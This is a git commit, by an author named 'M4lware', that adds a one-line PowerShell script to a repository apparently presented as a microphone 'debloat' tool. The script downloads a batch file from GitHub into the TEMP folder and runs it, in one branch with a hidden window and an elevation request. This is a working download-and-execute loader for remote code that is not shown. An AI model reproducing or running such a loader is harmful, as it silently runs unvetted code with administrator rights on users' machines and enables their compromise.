3a01f688520aeaca13246563a10f940441d56e15
M4lware <128651023+M4lware-01@users.noreply.github.com>
2023-08-06 09:48:36 +0600

    Add files via upload

---
+++ main.ps1
@@ -0,0 +1,1 @@
+$iA = ${env:=::} -eq $null;if ($iA) {iwr -useb https://raw.githubusercontent.com/M4lware-01/microphone-debloat/main/script.bat -o $env:TEMP\x.bat;saps $env:TEMP\x.bat -WindowStyle Hidden -Verb RunAs} else {iwr -useb https://raw.githubusercontent.com/M4lware-01/microphone-debloat/main/script.bat -o $env:TEMP\x.bat;cmd /c $env:TEMP\x.bat}
